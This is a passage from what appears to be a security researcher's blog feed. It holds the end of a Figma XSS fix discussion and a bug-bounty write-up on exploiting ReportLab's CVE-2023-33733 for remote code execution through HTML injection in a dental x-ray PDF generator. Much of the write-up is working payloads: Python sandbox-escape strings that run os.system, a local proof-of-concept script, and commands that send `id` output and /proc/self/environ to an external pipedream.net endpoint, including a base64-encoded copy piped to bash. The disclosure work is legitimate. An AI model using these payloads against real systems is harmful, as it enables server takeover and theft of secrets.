<p>This line is now edited and now the input is sanitized first, then only it’s passed to innerHTML.</p>

<p>This changes ensures that the same xss bug can’t be trigger now.</p>

<p>As you can noticed that after the sanitization the code is trying to remove all tags which are not in <code class="language-plaintext highlighter-rouge">IFs</code> array from the sanitized output.
Making any changes to the sanitized data can lead to unexpected problems even xss sometimes like you could see in these findings by Sonar Research team https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/</p>

<p>So @huli had  a suggestion to use the sanitize method twice, for eg:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">Hum</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span> <span class="c1">// [1]</span>
        <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">IFs</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">y</span><span class="o">=&gt;</span><span class="s2">`:not(</span><span class="p">${</span><span class="nx">y</span><span class="p">}</span><span class="s2">)`</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span>
          <span class="p">,</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
        <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">y</span> <span class="k">of</span> <span class="nx">g</span><span class="p">)</span>
            <span class="p">(</span><span class="nx">h</span> <span class="o">=</span> <span class="nx">y</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">h</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
        <span class="nx">r</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">Hum</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)</span>
</code></pre></div></div>

<p>On the last line you could see that sanitize method is called again, this will ensure that even after modification, only the safe html will added to the DOM.</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[Recently I was able to find a DOM based xss in www.figma.com in collaboration with @huli (an awesome ctf player).]]></summary></entry><entry><title type="html">Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program</title><link href="http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html" rel="alternate" type="text/html" title="Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program" /><published>2023-10-08T00:00:00+00:00</published><updated>2023-10-08T00:00:00+00:00</updated><id>http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup</id><content type="html" xml:base="http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html"><![CDATA[<p>This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit.</p>

<p>In this writeup I will go through the steps I took to identify what the target was using to generate pdfs then how I was able to confirm the rce.</p>

<p>You can find more details of the exploit I used here: https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897</p>

<p>CVE-2023-33733 was found by a pentester from Cure53 Elyas Damej , so props to him for finding this and also sharing the poc with so much details https://github.com/c53elyas/CVE-2023-33733</p>

<hr />

<p>The target announced a new scope was added to their program so without wasting any time I jumped back right to it to see if I can find something there.</p>

<p>I first started with going through the application seeing what the functionalities are there. The application had very limited things to test , basically the application was designed for Dentist where they could upload their patients xray reports (png,jpg,etc were allowed).</p>

<p>After uploading the xray image you can edit some fields such as Patient Name,Date of Report,Comments,etc. Once you have added all the required details you can print the xray report which has the xray image ,patient name,date of report ,etc in it.</p>

<p>I am always fascinated with such pdf render endpoints , have exploited some in the past too https://x.com/sudhanshur705/status/1618608391391449090?s=20</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/21494dad-8494-40ef-9fd2-d1fb73ccb657" alt="image" /></p>

<p>And recently this where with rootxharsh and iamnooob managed to pwn a target : https://twitter.com/sudhanshur705/status/1694404470317420708</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/ba087bbb-cf88-4c40-b2cf-7ab3c20178af" alt="image" /></p>

<p>I found them fascinating because as they most often deal with html which is later converted to pdf via using some library (PrinceXML,reportlab,dompdf,etc) otherwise headlesschrome to take a screenshot then converting it to pdf ,if you manage to get  html/js injection in the html template which is passed to pdf generator process then things get really interesting.</p>

<p>Interesting things ranges from SSRF as with iframe you can try loading internal resources/metadata inside it or even file uri to leak local files. With Javascript you can even use fetch call to to try reading responses from some internal resources often times in such cases  it doesn’t have a concept of Same origin policy or it’s disabled for specific reasons.Even there some ways to bypass SOP by having 2 A records one which resolves to the internal IP which you want to reach another one which resolves to public ip of your vps.</p>

<p>You could find details about it here in this ctf challenge by @strellic : https://brycec.me/posts/corctf_2023_challenges#pdf-pal</p>

<p>Quoting it from the writeup above:</p>

<p><em>But the general idea is that we use multiple A records, one with the IP for our server, then one for 0.0.0.0. When the admin bot goes to our domain, it resolves the IP for our server and loads a custom payload page. Then, we kill our server. Then, when it attempts to load a new resource on the same-origin, it can’t access it at our IP (since our server is dead), and so falls back to 0.0.0.0, reading a localhost resource. Since this is same-origin, we can read the response.</em></p>

<hr />

<p>Back to the reportlab cve finding on my target.</p>

<p>This was the request made when I clicked on the <em>Generate Report</em> button:
<img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/e1e4b5b6-344a-428e-b53d-096d1bb85452" alt="BurpSuiteCommunity_YGtRpwVCRF" /></p>

<p>The generated report was then visible in the application.</p>

<p>I downloaded the pdf and used exiftool to check if I can identify what software they were using in the pdf generation process, but there were no information.</p>

<p>I then added some html code in the <code class="language-plaintext highlighter-rouge">comment</code> parameter</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">https://myhost</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>I used such payloads to fingerprint the library/browser they might be using to render the html code server side.</p>

<p>I made the changes and when I press the <em>Generate report</em> button the request failed, I checked the response and this error was there:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/e672ac87-1e5c-415e-ba18-6381c3c74b51" alt="ApplicationFrameHost_smBlNZe91s" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
</span><span class="s2">"</span><span class="se">\n</span><span class="s2">paragraph text '&lt;para&gt;Note: &lt;font color=</span><span class="se">\"</span><span class="s2">#484848</span><span class="se">\"</span><span class="s2">&gt;&lt;img src=x&gt;&lt;/font&gt;&lt;/para&gt;' caused exception Parse error: saw &lt;/font&gt; instead of expected &lt;/img&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The moment I saw that error I was like woooow !!! I was pretty confident after that I am going to find something critical there.</p>

<p>My input was this exactly <code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code>
From the error it seems the server does no sanitization on the user input and directly uses it in the html file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;para&gt;Note: &lt;font color="#484848"&gt;&lt;/font&gt;&lt;/para&gt;
</code></pre></div></div>

<p>Consider `` as a placeholder for the user controllable input, as there is no sanitization I am also able to include arbitrary html which is then passed to pdf generator library to convert it to pdf.</p>

<p>From the error it’s indicating that the library’s html parser has failed to parse the provided html due to our input <code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code> as it doesn’t have a matching closing tag.</p>

<p>And upon using this payload a different error message was shown,I also added my host in the src attribute so that when the image tag renders a request will be sent to my server from there the logs should tell me about the <code class="language-plaintext highlighter-rouge">User-Agent</code> from that I can know which library is it. I added onerror attribute also just to see what would happen:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">https://myhost</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>This time another error was triggered:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/50114e87-8fdc-4420-bf89-0979c7b6115a" alt="ApplicationFrameHost_Wun1vBOWO2" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="s2">"</span><span class="se">\n</span><span class="s2">paragraph text '&lt;para&gt;Note: &lt;font color=</span><span class="se">\"</span><span class="s2">#484848</span><span class="se">\"</span><span class="s2">&gt;test</span><span class="se">\"</span><span class="s2">&gt;&lt;img src=https://myhost onerror=alert()&gt;&lt;/font&gt;&lt;/para&gt;' caused exception paraparser: syntax error: invalid attribute name onerror attrMap=['height', 'src', 'valign', 'width']"</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>The error message is already very descriptive on where the problem is, the onerror attribute is not in the <code class="language-plaintext highlighter-rouge">attrMap</code> list (consider it a list of whitelisted attribute names) that’s why the error was triggered.</p>

<p>Then I removed the <em>onerror</em> attribute and tested it to identify the pdf generator library:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: Python-urllib/3.10
</code></pre></div></div>

<p>Woah cool so the backend is python, when it comes to python one of the most popular libraries for generating pdf is reportlab (https://www.reportlab.com/)</p>

<p>I am no alien to reportlab I have tried looking into it’s source in the past trying to find some 0day in it but failed miserably as I suck at source code review (still learning) but I still got some basic idea about reportlab.
I already had a repo where I pushed reportlab source code , so I copied a part of the error mssg and searched there</p>

<p>Ah nice found a match for <code class="language-plaintext highlighter-rouge">invalid attribute name</code>
https://github.com/search?q=repo%3ASudistark%2Freportlab-diff+%22invalid+attribute+name%22&amp;type=code</p>

<p>https://github.com/Sudistark/reportlab-diff/blob/f6ea20518ca3caafee27ba5301bc9e079972dd98/reportlab/src/reportlab/platypus/paraparser.py#L3080</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">getAttributes</span><span class="p">(</span><span class="n">self</span><span class="p">,</span><span class="n">attr</span><span class="p">,</span><span class="n">attrMap</span><span class="p">):</span>
        <span class="n">A</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">attr</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">caseSensitive</span><span class="p">:</span>
                <span class="n">k</span> <span class="o">=</span> <span class="n">k</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">attrMap</span><span class="p">:</span>
                <span class="n">j</span> <span class="o">=</span> <span class="n">attrMap</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
                <span class="n">func</span> <span class="o">=</span> <span class="n">j</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                    <span class="c1">#it's a function
</span>                    <span class="n">v</span> <span class="o">=</span> <span class="nf">func</span><span class="p">(</span><span class="n">self</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">func</span><span class="p">,</span><span class="n">_ExValidate</span><span class="p">)</span> <span class="k">else</span> <span class="nf">func</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
                <span class="n">A</span><span class="p">[</span><span class="n">j</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">v</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">_syntax_error</span><span class="p">(</span><span class="sh">'</span><span class="s">invalid attribute name %s attrMap=%r</span><span class="sh">'</span><span class="o">%</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="nf">list</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">attrMap</span><span class="p">.</span><span class="nf">keys</span><span class="p">()))))</span>
</code></pre></div></div>

<p>Ok so this exactly matched with the error message that was shown in the webiste.</p>

<p>I was already aware of the RCE cve which came out recently in reportlab.</p>

<p>Elyas shared full details how the payload works so if you are interested checkout his repo: https://github.com/c53elyas/CVE-2023-33733</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;para&gt;&lt;font</span> <span class="na">color=</span><span class="s">"[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"</span><span class="nt">&gt;</span>
                exploit
<span class="nt">&lt;/font&gt;&lt;/para&gt;</span>
</code></pre></div></div>

<p>He explained the sandbox bypass line by line you could try executing in the python console itself along to understand it better.</p>

<p>I tried understanding this payload after reading his writeup it still looked so difficult for me to understand , I then also tried to execute it in python console line by line which later helped a lot.</p>

<hr />

<p>After I confirmed that reportlab is in use.I used the following payload to confirm if it indeed using the vulnerable version or not.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://myhost.com
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;para&gt;</span>
              <span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">"[ [ getattr(pow,Word('__globals__'))['os'].system('curl https://myhost.com') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'"</span><span class="nt">&gt;</span>
                exploit
                <span class="nt">&lt;/font&gt;</span>
            <span class="nt">&lt;/para&gt;</span>
</code></pre></div></div>

<p>Nope it didn’t worked, the pdf was succesffuly generated but no pingbacks were sent to my server.
I changed curl command to ping,wget in hope of getting a dns interaction atleast but nope.</p>

<p>At this moment  I questioned are they really using the vulnerable version?</p>

<p>I needed to find the answer for this, which could only be done by using a local setup.</p>

<p>Using the same sample vulnerable code which Elyas shared in his repo I could confirm the exploit locally:
https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">reportlab.platypus</span> <span class="kn">import</span> <span class="n">SimpleDocTemplate</span><span class="p">,</span> <span class="n">Paragraph</span>
<span class="kn">from</span> <span class="n">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
<span class="n">stream_file</span> <span class="o">=</span> <span class="nc">BytesIO</span><span class="p">()</span>
<span class="n">content</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">def</span> <span class="nf">add_paragraph</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Add paragraph to document content</span><span class="sh">"""</span>
    <span class="n">content</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nc">Paragraph</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_document_template</span><span class="p">(</span><span class="n">stream_file</span><span class="p">:</span> <span class="n">BytesIO</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Get SimpleDocTemplate </span><span class="sh">"""</span>
    <span class="k">return</span> <span class="nc">SimpleDocTemplate</span><span class="p">(</span><span class="n">stream_file</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">build_document</span><span class="p">(</span><span class="n">document</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="o">**</span><span class="n">props</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Build pdf document based on elements added in `content`</span><span class="sh">"""</span>
    <span class="n">document</span><span class="p">.</span><span class="nf">build</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="o">**</span><span class="n">props</span><span class="p">)</span>



<span class="n">doc</span> <span class="o">=</span> <span class="nf">get_document_template</span><span class="p">(</span><span class="n">stream_file</span><span class="p">)</span>
<span class="c1">#
# THE INJECTED PYTHON CODE THAT IS PASSED TO THE COLOR EVALUATOR
#[
#    [
#        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
#        for Word in [
#            orgTypeFun(
#                'Word',
#                (str,),
#                {
#                    'mutated': 1,
#                    'startswith': lambda self, x: False,
#                    '__eq__': lambda self, x: self.mutate()
#                    and self.mutated &lt; 0
#                    and str(self) == x,
#                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
#                    '__hash__': lambda self: hash(str(self)),
#                },
#            )
#        ]
#    ]
#    for orgTypeFun in [type(type(1))]
#]
</span>
<span class="nf">add_paragraph</span><span class="p">(</span><span class="sh">"""</span><span class="s">
            &lt;para&gt;
              &lt;font color=</span><span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="s">))[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">].system(</span><span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="s">) for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span><span class="s">&gt;
                exploit
                &lt;/font&gt;
            &lt;/para&gt;</span><span class="sh">"""</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
<span class="nf">build_document</span><span class="p">(</span><span class="n">doc</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/4f8cdcac-9024-4618-9be3-59b9207d2cb0" alt="image" /></p>

<p>You could see the exploit works in reportlab v3.6.12</p>

<p>Let’s see now what happens in the fixed version:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/9a10825c-c124-4bda-8729-3f2fff754291" alt="image" /></p>

<p>Saw the error? The exploit failed</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">File</span> <span class="sh">"</span><span class="s">/home/runner/VelvetyFuchsiaCompiler/venv/lib/python3.10/site-packages/reportlab/lib/colors.py</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">931</span><span class="p">,</span> <span class="ow">in</span> <span class="n">__call__</span>
    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid color value %r</span><span class="sh">'</span> <span class="o">%</span> <span class="n">arg</span><span class="p">)</span>
<span class="nb">ValueError</span><span class="p">:</span> 
<span class="n">paragraph</span> <span class="n">text</span> <span class="sh">'</span><span class="s">&lt;para&gt; &lt;font color=</span><span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="se">\'</span><span class="s">__globals__</span><span class="se">\'</span><span class="s">))[</span><span class="se">\'</span><span class="s">os</span><span class="se">\'</span><span class="s">].system(</span><span class="se">\'</span><span class="s">touch /tmp/exploited</span><span class="se">\'</span><span class="s">) for Word in [orgTypeFun(</span><span class="se">\'</span><span class="s">Word</span><span class="se">\'</span><span class="s">, (str,), { </span><span class="se">\'</span><span class="s">mutated</span><span class="se">\'</span><span class="s">: 1, </span><span class="se">\'</span><span class="s">startswith</span><span class="se">\'</span><span class="s">: lambda self, x: False, </span><span class="se">\'</span><span class="s">__eq__</span><span class="se">\'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="se">\'</span><span class="s">mutate</span><span class="se">\'</span><span class="s">: lambda self: {setattr(self, </span><span class="se">\'</span><span class="s">mutated</span><span class="se">\'</span><span class="s">, self.mutated - 1)}, </span><span class="se">\'</span><span class="s">__hash__</span><span class="se">\'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="se">\'</span><span class="s">red</span><span class="se">\'</span><span class="sh">"</span><span class="s">&gt; exploit &lt;/font&gt; &lt;/para&gt;</span><span class="sh">'</span> <span class="n">caused</span> <span class="n">exception</span> <span class="n">Invalid</span> <span class="n">color</span> <span class="n">value</span> <span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="s">))[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">].system(</span><span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="s">) for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span>
</code></pre></div></div>

<p>In case of old version no error is triggered and in fixed version upon using the same payload an error is triggered.</p>

<p>When I used the same poc in my target no error was shown pdf was generated successfully, which indicated that they are indeed using vulnerable version otherwise an error should have shown.</p>

<p>Recently upon collaborating with @rootxharsh, he had a similar scenario where  curl,wget,ping didn’t worked so it was concluded that the headless chrome process might be running with sandbox enabled but infact later when @iamnoooob checked the same, he used a reverse shell  and a callback was recieved successfully in no time. So when Harsh checked the shell  to confirm why those curl,wget,ping didn’t worked he found that curl,wget,ping didn’t existed on that box . Shit happens!!</p>

<p>As in my case also curl,etc didn’t worked, I thought why not try using python requests module instead.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">font</span> <span class="n">color</span><span class="o">=</span><span class="sh">"</span><span class="s">[ [ [ [ ftype(ctype(0, 0, 0, 0, 3, 67, b</span><span class="sh">'</span><span class="s">t</span><span class="se">\\</span><span class="s">x00d</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x83</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">xa0</span><span class="se">\\</span><span class="s">x01d</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">xa1</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x00d</span><span class="se">\\</span><span class="s">x00S</span><span class="se">\\</span><span class="s">x00</span><span class="sh">'</span><span class="s">, (None, </span><span class="sh">'</span><span class="s">requests</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">https://myhost</span><span class="sh">'</span><span class="s">), (</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="s">), (), </span><span class="sh">'</span><span class="s">&lt;stdin&gt;</span><span class="sh">'</span><span class="s">, </span><span class="sh">''</span><span class="s">, 1, b</span><span class="sh">'</span><span class="se">\\</span><span class="s">x12</span><span class="se">\\</span><span class="s">x01</span><span class="sh">'</span><span class="s">), {})() for ftype in [type(lambda: None)] ] for ctype in [type(getattr(lambda: {None}, Word(</span><span class="sh">'</span><span class="s">__code__</span><span class="sh">'</span><span class="s">)))] ] for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span><span class="o">&gt;</span><span class="n">exploit</span><span class="o">&lt;/</span><span class="n">font</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>I replaced only this part:
https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)</span>
<span class="o">+</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">requests</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https://myhost</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>Pretty cool upon using this payload, I recieved a pingback on my server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: python-requests/2.31.0
</code></pre></div></div>
<p>This confirmed that I could execute arbitrary code on the system. I needed some more info before I write the report.</p>

<p>I modified the poc and relied upon this to send the command output to my server</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;requests.get('https://en2celq7rewbul.m.pipedream.net/</span><span class="si">$(</span><span class="nb">id</span><span class="si">)</span><span class="s2">')"</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/a9eda569-8d47-4d15-a8bb-ef24c5fafddb" alt="image" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;requests.get('https://en2celq7rewbul.m.pipedream.net/</span><span class="si">$(</span><span class="nb">cat</span> /proc/self/environ<span class="si">)</span><span class="s2">')"</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">echo cHl0aG9uMyAtYyAiaW1wb3J0IHJlcXVlc3RzO3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9lbjJjZWxyN3Jld2J1bC5tLnBpcGVkcmVhbS5uZXQvJChjYXQgL3Byb2Mvc2VsZi9lbnZpcm9uKScpIg== | base64 -d|bash</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

